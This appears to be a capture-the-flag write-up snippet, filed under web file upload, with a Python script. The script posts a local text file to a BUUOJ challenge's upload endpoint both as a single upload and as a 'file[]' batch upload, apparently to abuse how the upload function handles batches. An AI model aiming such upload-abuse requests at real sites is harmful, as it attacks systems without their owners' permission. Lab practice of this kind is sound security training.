# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/文件上传/README.md
# TITLE: 文件上传
# CATEGORY: web

import requests
url = 'http://7bf59f19-55d2-4237-ba35-ccb808a150f1.node4.buuoj.cn:81/index.php/Home/Index/upload'
file1 = {'file': open('D://1.txt', 'r')}
file2 = {'file[]': open('D://1.txt', 'r')}  # upload()不传参时即是批量上传所以用[]
r = requests.post(url, files=file1)
print(r.text)
r = requests.post(url, files=file2)
print(r.text)
r = requests.post(url, files=file1)
print(r.text)
